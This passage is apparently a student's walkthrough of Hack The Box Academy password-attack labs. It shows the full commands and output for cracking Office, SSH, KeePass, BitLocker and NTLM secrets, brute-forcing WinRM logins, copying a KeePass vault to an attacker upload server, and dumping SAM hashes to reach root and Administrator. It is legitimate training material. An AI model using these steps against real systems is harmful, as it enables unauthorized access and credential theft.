Use the "--show" option to display all of the cracked passwords reliably
```

Unzip the file.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/Docs]
└─$ unzip Docs.zip
Archive:  Docs.zip
[Docs.zip] Documentation.docx password: 
  inflating: Documentation.docx

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/Docs]
└─$ ls
Docs.zip  Documentation.docx  hash.txt
```

We get a Microsoft word file (`.docx`).

Extract the hash and crack it.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/Docs]
└─$ office2john Documentation.docx > docx_hash.txt

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/Docs]
└─$ john --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list docx_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
987654321        (Documentation.docx)     
1g 0:00:00:00 DONE (2023-02-10 13:08) 1.052g/s 3772p/s 3772c/s 3772C/s 9876542017!..98765432109
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now download and install LibreOffice if not already installed.

Then open the document.

![](./attachments/Pasted%20image%2020230210191322.png)

user:pass `jason:C4mNKjAtL2dydsYa6`

MySQL might be running on `localhost`.

![](./attachments/Pasted%20image%2020230210195126.png)

```
jason@skills-medium:~$ mysql -u jason -pC4mNKjAtL2dydsYa6 -h 127.0.0.1
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.01 sec)

mysql> use users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| creds           |
+-----------------+
1 row in set (0.01 sec)

mysql> select * from creds;
+-----+--------------------+----------------+
| id  | name               | password       |
+-----+--------------------+----------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX    |
|   2 | Shelley Levy       | GOK34QLM1DT    |
(...)
| 100 | Lael Rivers        | YNQ63NWP1RD    |
| 101 | dennis             | 7AUgWWQEiMPdqx |
+-----+--------------------+----------------+
101 rows in set (0.00 sec)

mysql> 
```

user:pass `dennis:7AUgWWQEiMPdqx`

We find an `SSH` key, is it root?

```
dennis@skills-medium:~$ ls -lah
total 860K
drwxr-xr-x 7 dennis dennis 4.0K Feb 10 19:25 .
drwxr-xr-x 4 root   root   4.0K Feb 10  2022 ..
-rw------- 1 dennis dennis  143 Mar 25  2022 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 dennis dennis 3.7K Feb 25  2020 .bashrc
drwx------ 2 dennis dennis 4.0K Mar 25  2022 .cache
drwx------ 3 dennis dennis 4.0K Mar 25  2022 .config
drwx------ 3 dennis dennis 4.0K Feb 10 19:44 .gnupg
-rwxrwxr-x 1 dennis dennis 809K Feb 10 19:07 linpeas.sh
drwxrwxr-x 3 dennis dennis 4.0K Feb 10 19:25 .local
-rw-r--r-- 1 dennis dennis  807 Feb 25  2020 .profile
drwx------ 2 dennis dennis 4.0K Feb 10  2022 .ssh
-rw------- 1 dennis dennis  876 Feb 10  2022 .viminfo
dennis@skills-medium:~$ cd .ssh
dennis@skills-medium:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
dennis@skills-medium:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,735C4BC00394A787F6FCE95C5B7F2331

M4SBfHkWiWdvYwd2rKdsBc8K4dwYbFmIyu4O9xdPhmP4rj7j7IuNBAPv11CCaehU
9pbD5Do598eek6h6cKuA0YG4n+OyunC4kO1J4qFHzIBMUhKDOA3V7x97lhgfTB4w
IS+zMgABo3q2yem9+EMh34qkwhO5MiP6V2id23vMW7gYi7H1AuTrCutYdlc/uox2
LcASkaRpDc+diBCP53Hq6xbc5vSoBk9f9HMl1reZWUR/PHomXt8yBCdZINKPISU0
1LaSTDIFglYplN/CDpOqJifDyQjk5SyTEKfN/fHiF2jpnqfMY475+vUNlKikHd79
Nyi9RAg3FJPR1n01ZAMLG9Ev4qWj7iNKEnyCBgsbqmjSpJ4Yse0CP3AXrp8nSUM6
anADGfhYVlVbLDP18BwJMe6RD0fYUJC1Yrz8v2vyZYd7PXltjfeEyoKUoQhdK90o
RTgu/UyoJE8GpqBj0zLBTd7IfInf3HNdVEYl0A5YAerWd2zpHrvdT03NMLbyvMBl
+EzoK3/gO2tol6V9szCTMTbJr97YwLXgFK1ujINnBip1BVO9oQbAeIVYXSaIc9Pj
qSOOxriPYgJeiTJrLzR5FffQaRuOmp7CQfxduaxILwBLliLPZP4u2IemQfasM0sw
(...)
uvjs98lfcvek5UDAlY4H0MABNU7KYnZMaIs2VnMRGJqI9wHKHePESlS/wwPN/vvE
EQOakeqOFo92xtHgNzg9pqvXH54M80dPy27raMaXA9oqt4/RWyeGZDu3riGTKa+4
0vavZvWG7j4NFn/tM7KtooOyi2QPlBCml2Xm4zRPVF3WOT6BGod9j8F30ZBqG8H0
W9t99JJyoLiqrFVsJNpn+biANu4oTHRI7WJl+JI3a44DwghAQUaQqXqsaR4H+AQn
CTS3VYbiVd7KrfBDFtFB4ml7kox399lFHuMza0t10+JwTuwIpUHSh8ay2d5vufaV
f60RV7h/1Ddo1RAfHmr/pzaVwlnWq/ymscRE2xVzKJFfG8tRxIWRg9EM/80DLBME
yRW7dyHrVT3e4go7jwBiWm0XQDT43WIIli3xEFGYFdYCewHVOOI4gViOgD2Ms1iY
IM+vYMZ/GV5fz7wRlM+jQ7gY7sw/iPKYgkUCr+d+5u6Uhu26EkkvkSrtkh/71cS0
d3CaHmZ/oeGy7/AYNIvANmmdmDpwZkSGaF3pDl+mKxMBu7x2h9dqjwysuUz6pdCW
3KJbiuZE9sixeUzOOaeFoOXTJG/+2NWseKwxycU+k6/7fPuaENBwxfx/fUh5Y9Mi
MkASEKmWm60x00uACDYRYE0h3yDHMSzf9dJkfyL9kR+3zLicbG8dUPFxF96BYldu
o+Sz3goUv5/STFGjDaDhk05jHISMU9qGehxpzNaWx6Mu0bO/XIoXhRK2LFgDqjGS
-----END RSA PRIVATE KEY-----
```

After copying the key to the attack host:

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ sudo ssh2john id_rsa > id_rsa.hash

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ cat id_rsa.hash 
id_rsa:$sshng$1$16$735C4BC00394A787F6FCE95C5B7F2331$1776$3384817c791689676f630776aca76c05cf0ae1dc186c5988caee0ef7174f8663f8ae3ee3ec8b8d0403efd7
(...)
3e4b3de0a14bf9fd24c51a30da0e1934e631c848c53da867a1c69ccd696c7a32ed1b3bf5c8a178512b62c5803aa3192

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ john --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd12020!   (id_rsa)     
1g 0:00:00:00 DONE (2023-02-10 15:28) 9.090g/s 648727p/s 648727c/s 648727C/s p@ssw0rd12011!..P@ssw0rd12021
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ sudo ssh root@10.129.168.49 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 10 Feb 2023 08:28:54 PM UTC

  System load:  0.0                Processes:               176
  Usage of /:   26.8% of 13.72GB   Users logged in:         0
  Memory usage: 29%                IPv4 address for ens192: 10.129.168.49
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Mar 25 15:41:38 2022 from 10.129.202.106
root@skills-medium:~# cat /root/flag.txt
HTB{PeopleReuse_PWsEverywhere!}
```

**Answer:** `HTB{PeopleReuse_PWsEverywhere!}`

---
## Password Attacks Lab - Hard
### Question:

nmap:

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ sudo nmap -n -sV -sC 10.129.107.239  
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 05:00 EST
Nmap scan report for 10.129.107.239
Host is up (0.058s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
(...)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINSRV
|   NetBIOS_Domain_Name: WINSRV
|   NetBIOS_Computer_Name: WINSRV
|   DNS_Domain_Name: WINSRV
|   DNS_Computer_Name: WINSRV
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-13T10:01:17+00:00
|_ssl-date: 2023-02-13T10:01:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WINSRV
| Not valid before: 2023-02-12T09:59:53
|_Not valid after:  2023-08-14T09:59:53
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-13T10:01:21
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.11 seconds

```

Bruteforce RDP login.

```
┌──(kali㉿kali)-[~/Downloads/Password-Attacks/Password-Attacks]
└─$ crackmapexec winrm 10.129.202.222 -u Johanna -p mut_password2.list
SMB         10.129.202.222  5985   WINSRV           [] Windows 10.0 Build 17763 (name:WINSRV) (domain:WINSRV)
HTTP        10.129.202.222  5985   WINSRV           [] http://10.129.202.222:5985/wsman
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna: "SpnegoError (16): Operation not supported or available, Context: Retrieving NTLM store without NTLM_USER_FILE set to a filepath"
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:!
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:00000
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:00000!
(...)
WINSRV\Johanna:1231232022!
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:1231233
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:1231233!
WINRM       10.129.202.222  5985   WINSRV           [-] WINSRV\Johanna:1231234
WINRM       10.129.202.222  5985   WINSRV           [+] WINSRV\Johanna:1231234! (Pwn3d!)
```

There is a KeePass file in the Documents folder.

![](./attachments/Pasted%20image%2020230213113541.png)

Let's upload it to our attack host. First we will setup an upload server on the host.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ python3 -m uploadserver 8000
```

The server will be up at `http://10.10.15.86:8000/upload`.

Navigate to the page and upload the file.

![](./attachments/Pasted%20image%2020230213113945.png)

The file is recieved:

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ ls         
Logins.kdbx  
```

Let's use John the Ripper to extract the hash.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ locate *2john* | grep keepass
/usr/sbin/keepass2john

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ keepass2john Logins.kdbx > keepass.hash
 
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ ls                           
keepass.hash  Logins.kdbx 

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ john  --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list keepass.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty7!         (Logins)     
1g 0:00:04:47 DONE (2023-02-13 05:49) 0.003481g/s 254.4p/s 254.4c/s 254.4C/s qwerty4!..qwerty8
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Pass: `Qwerty7!`

Open the file by double-clicking and insert the password to open the vault.

![](./attachments/Pasted%20image%2020230213120051.png)

user:pass `david:gRzX7YbeTcDG7`

The recycle bin also contains passwords.

![](./attachments/Pasted%20image%2020230213120256.png)

user:pass `User Name:Password`
user:pass `Michael321:12345`

Running `cmd` as user david reveals a `backup.vhd` file. 

if we move it ti the public folder vi can access is at user Johanna and upload it to our python uploadserver.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ bitlocker2john -i Backup.vhd > backup.hashes

Signature found at 0x1000003
Version: 8 
Invalid version, looking for a signature with valid version...

Signature found at 0x3200000
Version: 2 (Windows 7 or later)

VMK entry found at 0x32000b1

VMK encrypted with User Password found at 32000d2
VMK encrypted with AES-CCM

VMK entry found at 0x3200191

VMK encrypted with Recovery Password found at 0x32001b2
Searching AES-CCM from 0x32001ce
Trying offset 0x3200261....
VMK encrypted with AES-CCM!!

Signature found at 0x3eab000
Version: 2 (Windows 7 or later)

VMK entry found at 0x3eab0b1

VMK entry found at 0x3eab191

Signature found at 0x4b56000
Version: 2 (Windows 7 or later)

VMK entry found at 0x4b560b1

VMK entry found at 0x4b56191

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ grep "bitlocker\$0" backup.hashes > backup.hash

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ john --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list backup.hash
Note: This format may emit false positives, so it will keep trying even after finding a possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (BitLocker, BitLocker [SHA-256 AES 32/64])
Cost 1 (iteration count) is 1048576 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456789!       (?)
```

Pass: `123456789!`

Now we need to mount the drive according to [this](https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0) article.

```
┌──(kali㉿kali)-[/mnt]
└─$ sudo modprobe nbd

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ sudo qemu-nbd -c /dev/nbd0 Backup.vhd
WARNING: Image format was not specified for 'Backup.vhd' and probing guessed raw.
         Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted.
         Specify the 'raw' format explicitly to remove the restrictions.

┌──(kali㉿kali)-[/dev]
└─$ lsblk
NAME     MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
sda        8:0    0 80.1G  0 disk 
└─sda1     8:1    0 80.1G  0 part /
sr0       11:0    1 1024M  0 rom  
nbd0      43:0    0  130M  0 disk 
├─nbd0p1  43:1    0   16M  0 part 
└─nbd0p2  43:2    0  112M  0 part 
(...)

┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ sudo cryptsetup bitlkOpen /dev/nbd0p2 backup 
Enter passphrase for /dev/nbd0p2:

┌──(kali㉿kali)-[/dev/mapper]
└─$ sudo mkdir /mnt/backup

┌──(kali㉿kali)-[/dev/mapper]
└─$ sudo mount /dev/mapper/backup /mnt/backup

┌──(kali㉿kali)-[/dev/mapper]
└─$ cd /mnt/backup

┌──(kali㉿kali)-[/mnt/backup]
└─$ ls
'$RECYCLE.BIN'   SAM   SYSTEM  'System Volume Information'

┌──(kali㉿kali)-[/mnt/backup]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
[*] Cleaning up...
```

Administrator NTLM hash: `e53d4d912d96874e83429886c7bf22a1`

Now we just need use the hash to crack the password. 

```
┌──(kali㉿kali)-[/mnt/backup]
└─$ john --format=NT --wordlist=~/HTB/PasswordAttacks/PasswordMutations/mut_password.list NTLM.hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Liverp00l8!      (?)     
1g 0:00:00:00 DONE (2023-02-13 14:32) 100.0g/s 5107Kp/s 5107Kc/s 5107KC/s Liverp00l2020!..liverpool2010!
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

And with hashcat

```
┌──(kali㉿kali)-[/mnt/backup]
└─$ sudo hashcat -m 1000 NTLM.hash ~/HTB/PasswordAttacks/PasswordMutations/mut_password.list 

(...)

e53d4d912d96874e83429886c7bf22a1:Liverp00l8!              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: e53d4d912d96874e83429886c7bf22a1
Time.Started.....: Mon Feb 13 14:33:13 2023 (0 secs)
Time.Estimated...: Mon Feb 13 14:33:13 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/HTB/PasswordAttacks/PasswordMutations/mut_password.list)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4906.3 kH/s (0.10ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 51200/94044 (54.44%)
Rejected.........: 0/51200 (0.00%)
Restore.Point....: 49152/94044 (52.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: l0vely84! -> Liverpool92!
Hardware.Mon.#1..: Util: 24%

Started: Mon Feb 13 14:33:12 2023
Stopped: Mon Feb 13 14:33:15 2023
```

user:pass `Administrator:Liverp00l8!`

Now RDP into the box as Administrator.

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/PasswordMutations/httpServer]
└─$ xfreerdp /u:Administrator /p:'Liverp00l8!' /v:10.129.103.24
```

![](./attachments/Pasted%20image%2020230213203952.png)

**Answer:** `HTB{PWcr4ck1ngokokok}`

---
**Tags:** [[Hack The Box Academy]]